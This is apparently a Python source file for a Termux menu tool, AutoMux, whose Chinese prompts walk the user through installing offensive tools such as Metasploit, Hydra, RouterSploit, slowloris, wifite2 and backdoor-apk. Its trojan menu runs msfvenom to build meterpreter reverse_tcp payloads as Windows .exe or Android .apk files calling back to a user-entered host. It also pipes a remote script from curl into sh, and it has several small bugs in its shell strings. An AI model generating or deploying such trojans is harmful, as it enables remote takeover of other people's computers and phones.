# -*- coding: utf-8 -*-

import os, sys
from time import sleep as timeout
from termcolor import colored 

pwd = os.getcwd()

banner_info ="""
+ -- --=[\033[1;0m AutoMux v2.6.6      (By.TsingPeng)\033[1;34m        ]
+ -- --=[ TsingPeng's blog:https://bcap03.top       ]
+ -- --=[ Root permission required with \033[1m '*'\033[1;34m        ]
+ -- --=[ Type \033[1;0m 'help'\033[1;34m for a list of commands       ]
"""

def banner():
    print(colored(banner_info,"blue",attrs=['bold']))

def error():   
    print(colored("\n输入错误，请重新输入！\n","red",attrs=['bold']))
    timeout(2)
    restart()

def okay():
    print(colored("\n安装成功！2秒后重启AutoMux\n","green"))
    timeout(2)
    restart()

def restart():
	python = sys.executable
	os.execl(python, python, * sys.argv)
	curdir = os.getcwd()

def backmenu():
    print(colored("\n       [99]","yellow") + " : Back Menu")
    print(colored("       [00]","yellow") + " : Exit AutoMux\n")
    backtomenu = input(colored("AutoMux >>> ","yellow"))
    if backtomenu == "99" or backtomenu == "9":
        restart()
    elif backtomenu == "00" or backtomenu == "0":
        sys.exit()
    else:error()

def help():
    print(colored("\n     change","yellow") + " : Change source")
    print(colored("    install","yellow") + " : List installation list")
    print(colored("     repair","yellow") + " : Repair MSF database")
    print(colored("     trojan","yellow") + " : Generate MSF Trojan")
    print(colored("     update","yellow") + " : Update AutoMux")
    print(colored("       exit","yellow") + " : Exit AutoMux\n")

def install_lazymux():
    print(colored("克隆Lazymux中，请稍后...","green"))
    os.system("git clone https://github.com/Gameye98/Lazymux.git $HOME/Lazymux")
    okay()

def install_Hydra():
    print(colored("安装Hydra中，请稍后...","green"))
    os.system("apt install hydra -y")
    print(colored("安装完成，输入'hydra'启动","green"))
    backmenu()

def qhd():
    print(colored("更换清华源中，请稍后...","green"))
    os.system("rm -rf $PREFIX/etc/apt/sources.list")
    os.system("rm -rf $PREFIX/etc/apt/sources.list.d/science.list")
    os.system("rm -rf $PREFIX/etc/apt/sources.list.d/game.list")
    os.system('echo "deb https://mirrors.tuna.tsinghua.edu.cn/termux/termux-packages-24 stable main" >$PREFIX/etc/apt/sources.list')
    os.system('echo "deb https://mirrors.tuna.tsinghua.edu.cn/termux/science-packages-24 science stable" >$PREFIX/etc/apt/sources.list.d/science.list')
    os.system('echo "deb https://mirrors.tuna.tsinghua.edu.cn/termux/game-packages-24 games stable" >$PREFIX/etc/apt/sources.list.d/game.list')
    os.system("apt update")
    print(colored("更换成功！2秒后重启AutoMux","green"))
    timeout(2)
    restart()

def gfy():
    print(colored("更换官方源中，请稍后...","green"))
    os.system("rm -rf $PREFIX/etc/apt/sources.list")
    os.system("rm -rf $PREFIX/etc/apt/sources.list.d/science.list")
    os.system("rm -rf $PREFIX/etc/apt/sources.list.d/game.list")
    os.system('echo "deb https://termux.org/packages/ stable main" >$PREFIX/etc/apt/sources.list')
    os.system('echo "deb https://dl.bintray.com/grimler/science-packages-24 science stable" >$PREFIX/etc/apt/sources.list.d/science.list')
    os.system('echo "deb https://dl.bintray.com/grimler/game-packages-24 games stable" >$$PREFIX/etc/apt/sources.list.d/game.list')
    os.system("apt update")
    print(colored("更换成功！2秒后重启AutoMux","green"))
    timeout(2)
    restart()

def install_msf():
    print(colored("安装msf中，请稍候...","green"))
    os.system("apt install unstable-repo -y")
    os.system("apt install metasploit -y")
    print(colored("安装完成，输入'msfconsole'启动","green"))
    backmenu()

def install_nmap():
    print(colored("安装Nmap中，请稍候...","green"))
    os.system("apt install nmap -y")
    print(colored("安装完成，输入'nmap'启动","green"))
    backmenu()

def repair_msf():
    print(colored("修复msf数据库中，请稍候...","green"))
    os.system("pg_ctl -D $PREFIX/var/lib/postgresql -l logfile start")   
    print(colored("修复成功！2秒后重启AutoMux","green"))
    timeout(2)
    restart()

def install_zsh():
    print(colored("安装zsh中，请稍候...","green"))
    os.system('sh -c "$(curl -fsSL https://github.com/Cabbagec/termux-ohmyzsh/raw/master/install.sh )"')
    okay()

def install_sqlmap():
    print(colored("安装sqlmap中，请稍候...","green"))
    os.system("apt install unstable-repo -y")
    os.system("apt install sqlmap -y")
    print(colored("安装完成，输入'sqlmap'启动","green"))
    backmenu()

def install_RouterSploit():
    print(colored("安装RouterSploit中，请稍候...","green"))
    os.system("apt install python python2 git wget curl clang make cmake -y")
    os.system("git clone https://www.github.com/threat9/routersploit")
    os.chdir("%s/routersploit"%pwd)
    os.system("python setup.py install")
    os.system("pip install -r requirements-dev.txt")
    os.system("pip install -r requirements.txt")
    os.chdir("%s"%pwd)
    os.system('echo "python $HOME/routersploit/rsf.py" > $PREFIX/bin/rsf')
    os.system("chmod +x $PREFIX/bin/rsf")
    print(colored("安装完成，输入'rsf'启动","green"))
    backmenu()

def install_RED_HAWK():
    print(colored("克隆RED_HAWK中，请稍候...","green"))
    os.system("apt install php")
    os.system("git clone https://github.com/Tuhinshubhra/RED_HAWK.git $HOME/RED_HAWK")
    okay()

def install_slowloris():
    print(colored("克隆slowloris中，请稍候...","green"))
    os.system("git clone https://github.com/gkbrk/slowloris.git")
    okay()

def install_dnsmap():
    print(colored("克隆dnsmap中，请稍候...","green"))
    os.system("git clone https://github.com/makefu/dnsmap.git $HOME/dnsmap")
    okay() 

def install_sslscan():
    print(colored("安装sslscan中，请稍候...","green"))
    os.system("pkg install sslscan -y")
    print(colored("安装完成，输入'sslscan'启动","green"))
    backmenu() 

def install_SlowHTTPTest():
    print(colored("克隆SlowHTTPTest中，请稍候...","green"))
    os.system("git clone https://github.com/shekyan/slowhttptest.git $HOME/slowhttptest")
    okay() 

def install_bettercap():
    print(colored("安装Bettercap中，请稍候...","green"))
    os.system("apt install root-repo")
    os.system("apt install bettercap -y")
    print(colored("安装完成，输入'bettercap'启动","green"))
    backmenu()

def install_Cupp():
    print(colored("克隆Cupp中，请稍候...","green"))
    os.system("git clone https://github.com/Mebus/cupp.git $HOME/cupp")
    okay()    

def install_HashBuster():
    print(colored("克隆Hash-Buster中，请稍候...","green"))
    os.system("git clone https://github.com/UltimateHackers/Hash-Buster.git $HOME/Hash-Buster")
    okay()     

def WindouwsMM():
    LHOST = input(colored("请输入本机IP地址 >>> ","green"))
    LPORT = input(colored("请输入要监听的端口 >>> ","green"))
    exenmap = input(colored("请输入文件名字(.exe) >>> ","green"))
    bcml = input(colored("请输入保存地址 >>> ","green"))
    print(colored("正在为Windouws生成LHOST为: %s LPORT为: %s 的 %s文件...","yellow") %(LHOST,LPORT,exenmap))
    os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe > %s/%s" % (LHOST,LPORT,bcml,exenmap))
    print(colored("生成完毕!2秒后重启程序","yellow"))
    timeout(2)
    restart()

def Windouws64MM():
    LHOST = input(colored("请输入本机IP地址 >>> ","green"))
    LPORT = input(colored("请输入要监听的端口 >>> ","green"))
    exenmap = input(colored("请输入文件名字(.exe) >>> ","green"))
    bcml = input(colored("请输入保存地址 >>> ","green"))
    print(colored("正在为Windouws X64生成LHOST为: %s LPORT为: %s 的 %s文件...","yellow") %(LHOST,LPORT,exenmap))
    os.system("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe > %s/%s" % (LHOST,LPORT,bcml,exenmap))
    print(colored("生成完毕!2秒后重启程序","yellow"))
    timeout(2)
    restart()

def msf_mm():
    print(colored("\n请选择运行系统:\n","cyan",attrs=['bold']))
    print("    [01]  Windows")
    print("    [02]  Windows X64")
    print("    [03]  Android\n")
    print("    [00]  Bcak Menu\n")
    OS = input(colored("AutoMux >>> ","yellow",attrs=['bold']))
    if OS.strip() == "1" or OS.strip() == "01":WindouwsMM()
    elif OS.strip() == "2" or OS.strip() == "02":Windouws64MM()
    elif OS.strip() == "3" or OS.strip() == "03":AndroidMM()
    elif OS.strip() == "0" or OS.strip() == "00":restart()
    else:error()

def AndroidMM():
    LHOST = input(colored("请输入本机IP地址 >>> ","green"))
    LPORT = input(colored("请输入要监听的端口 >>> ","green"))
    exenmap = input(colored("请输入文件名字(.apk) >>> ","green"))
    bcml = input(colored("请输入保存地址 >>> ","green"))
    print(colored("正在为Android生成LHOST为: %s LPORT为: %s 的 %s文件...","yellow") %(LHOST,LPORT,exenmap))
    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s/%s" %(LHOST,LPORT,bcml,exenmap))
    print(colored("生成完毕!2秒后重启程序","yellow"))
    timeout(2)
    restart()

def install_hping3():
    print(colored("安装hping3中，请稍候...","green"))
    os.system("apt install root-repo")
    os.system("apt install hping3 -y")
    print(colored("安装完成，输入'hping3'启动","green"))
    backmenu()

def install_aircrack_ng():
    print(colored("安装Aircrack-ng中，请稍候...","green"))
    os.system("apt install root-repo")
    os.system("apt install aircrack-ng -y")
    print(colored("安装完成，输入'aircrack-ng'启动","green"))
    backmenu()

def install_WebCrack():
    print(colored("克隆WebCrack中，请稍候...","green"))
    os.system("git clone https://github.com/yzddmr6/WebCrack")
    os.system("pip install bs4 lxml requests")
    okay()

def install_webdirscan():
    print(colored("克隆webdirscan中，请稍候...","green"))
    os.system("git clone https://github.com/Strikersb/webdirscan.git")
    os.system("pip install requests")
    okay()

def install_Crunch():
    print(colored("安装Crunch中，请稍候...","green"))
    os.system("apt install unstble-repo -y")
    os.system("apt install crunch -y")
	#os.system("apt install crunch")
    print(colored("安装完成，输入'crunch'启动","green"))
    backmenu()


def install_wifite():
    print(colored("安装wifite2中，请稍候...","green"))
    os.chdir("%s"%pwd)
    os.system("apt install root-repo unstable-repo")
    os.system("apt install aircrack-ng iw ethtool wireless-tools hashcat macchanger tsu tshark -y")
    os.system("git clone https://github.com/derv82/wifite2.git $HOME/wifite")
    os.chdir("%s/wifite"%pwd)
    os.system("rm -rf setup.cfg")
    os.system('echo -e "[install]\ninstall-scripts=$PREFIX/bin" > setup.cfg"')
    os.system("tsudo python setup.py install")
    os.chdir("%s"%pwd)
    os.system("tsudo rm -rf $HOME/wifite")
    os.system("echo 'wifite --dict $PREFIX/share/dict/wordlist-top4800-probable.txt' > $PREFIX/bin/wifite2")
    os.system("chmod +x $PREFIX/bin/wifite2")
    print(colored("安装完成，输入'wifite2'启动","green"))
    print(colored("tips.请不要直接使用wifite打开，会检测不到字典位置，如果有需要请修改$PREFIX/bin/wifite2里的字典位置","green"))
    backmenu()       
        
def install_tcpscan():
    print(colored("安装tcpscan中，请稍等...","green"))
    os.system("apt install git cmake make clang -y")
    os.system("git clone https://github.com/xuxihai123/tcpscan")
    os.chdir("%s/tcpscan"%pwd)
    os.system("cmake .")
    os.system("make")
    os.system("cp tcpscan -r $PREFIX/bin/")
    os.chdir("%s"%pwd)
    print(colored("安装环境部署完成输入tcpscan即可执行","green"))
    backmenu()


def install_piescan():
    print(colored("安装piescan中，请稍等...","green"))
    os.system("apt update && apt upgrade -y")
    os.system("apt install python2 git -y")
    os.system("git clone https://github.com/m57/piescan")
    print(colored("克隆完成！","blue"))
    print(colored("请使用python2运行这个扫描器...","yellow"))
    backmenu()


def install_httpscan():
    print(colored("安装httpscan中，请稍等...","green"))
    os.system("apt update && apt upgrade -y")
    os.system("apt install python2 git -y")
    os.system("git clone https://github.com/zer0h/httpscan")
    print(colored("还有需求库安装","yellow"))
    os.system("pip2 install requests IPy")
    print(colored("安装完成!","blue"))
    print(colored("请使用python2运行httpscan","yellow"))
    backmenu()


def install_httpscan_python3():
    print(colored("安装httpscan-python3，请稍等...","green"))
    os.system("apt update && apt upgrade -y")
    os.system("apt install python git -y")
    os.system("git clone https://github.com/Kit4y/httpscan-python3")
    print(colored("还需要安装需求库","yellow"))
    os.system("pip3 install requests IPy")
    print(colored("安装完成!","blue"))
    print(colored("这是python3的版本请使用python3运行","yellow"))
    backmenu()


def install_D_Tect():
    print(colored("安装D-Tech中，请稍等...","green"))
    os.system("apt update && apt upgrade -y")
    os.system("apt install git python2 -y")
    os.system("git clone https://github.com/bibortone/D-Tech")
    print(colored("安装完成!","blue"))
    print(colored("这个工具使用python2来编写的，请使用python2运行!","yellow"))
    backmenu()


def install_scanless():
    print(colored("安装scanless，请稍等...","green"))
    os.system("apt update && apt upgrade -y")
    os.system("apt install python -y")
    os.system("pip install scanless")
    print(colored("安装完成!","blue"))
    print(colored("例如:scanless -t scanme.nmap.org -s spiderip","green"))
    print(colored("项目地址查看:https://github.com/vesche/scanless","white"))
    backmenu()


def install_IPGeolocation():
    print(colored("正在安装IPGeolocation，请稍等...","green"))
    os.system("apt update && apt upgrade -y")
    os.system("apt install git python -y")
    os.system("git clone https://github.com/maldevel/IPGeoLocation")
    print(colored("还需要安装需求库!","yellow"))
    os.chdir("%s/IPGeoLocation/"%pwd)
    os.system("pip3 install -r requirements.txt")
    os.chdir("%s"%pwd)
    print(colored("安装完成!","blue"))
    print(colored("现在可以使用python运行！","green"))
    backmenu()

def install_IP_Tracer():
    print(colored("正在安装IP-Tracer，请稍等...","green"))
    os.system("apt update && apt upgrade -y")
    os.system("apt install php git -y")
    os.system("git clone https://github.com/rajkumardusad/IP-Tracer.git")
    os.chdir("%s/IP-Tracer/"%pwd)
    os.system("chmod +x install trace ip-trace install")
    os.system("./install")
    print(colored("安装完成!","blue"))
    print(colored("这个是使用php写的工具，你可直接输入ip-trace运行","green"))
    backmenu()


def install_backdoor_apk():
    print(colored("正在安装backdoor-apk，请稍等...","green"))
    print(colored("这个免杀工具体积很大(235MB)，这里会停留1分钟，给你30秒的时间，准备挂梯子。","yellow"))
    print(colored("如果没有梯子你可以Ctrl+C取消安装，找梯子。","yellow"))
    timeout(30)
    os.system("cd /opt/")
    os.system("sudo apt update && sudo apt upgrade -y")
    print(colored("先安装小规模的需求库!","yellow"))
    os.system("sudo apt install bytecode-viewer libsmali-java smali apktool unzip git -y")
    print(colored("接下来安装大体积的需求库！","yellow"))
    os.system("sudo apt install metasploit-framework openjdk-11-jdk -y")
    print(colored("准备克隆backdoor-apk，请准备好梯子，我会等待30秒。","yellow"))
    print(colored("没有梯子克隆会很痛苦的！","red"))
    timeout(30)
    print(colored("请等待.......","blue"))
    os.system("git clone https://github.com/dana-at-cp/backdoor-apk")
    os.chdir("%s/backdoor-apk/"%pwd)
    print(colored("安装完成，你cd可以进去看一下运行一下","blue"))
    print(colored("玩法链接：https://github.com/dana-at-cp/backdoor-apk","green"))
    backmenu()


def install_msfpc():
    print(colored("正在安装msfpc，请稍等...","green"))
    os.system("sudo apt update && sudo apt upgrade -y")
    os.system("sudo apt install msfpc -y")
    print(colored("安装完成！","blue"))
    print(colored("你可以使用sudo msfpc查看使用的方法。","green"))
    backmenu()


def install_Websploit():
    print(colored("正在安装websploit，请稍等...","green"))
    os.system("apt update && apt upgrade -y")
    os.system("apt install python git -y")
    os.system("git clone https://github.com/websploit/websploit")
    os.chdir("%s/websploit/"%pwd)
    os.system("pip3 install -r requirements.txt")
    os.system("python setup.py install")
    print(colored("安装完成请在输入sudo websploit就可以执行了","blue"))
    backmenu()
    
    
def install_Devploit():
    print(colored("正在安装Devploit，请稍等....","green"))
    os.system("apt update && apt upgrade -y")
    os.system("apt install git python2")
    os.system("git clone https://github.com/vaginessa/Devploit")
    os.system("chmod +x Devploit/Devploit update.py install")
    print(colored("安装完成，如果想要把Devploit部署到环境里需要root权限","green"))
    print(colored("你可以去获取，如果不想获取直接运行！","blue"))
    backmenu()
    
    
def install_Devploit_old():
    print(colored("正在安装Devploit v1.1，请稍等...","green"))
    os.system("apt update && apt upgrade -y")
    os.system("apt install git python2 -y")
    os.system("git clone https://github.com/GhettoCole/Devploit Devploit-v1.1/")
    os.system("chmod +x Devploit-v1.1/Devploit install update.py")
    print(colored("安装完成，如果想要把Devploit部署到环境里需要root权限","green"))
    print(colored("你可以去获取，如果不想获取直接运行！","blue"))
    okay()
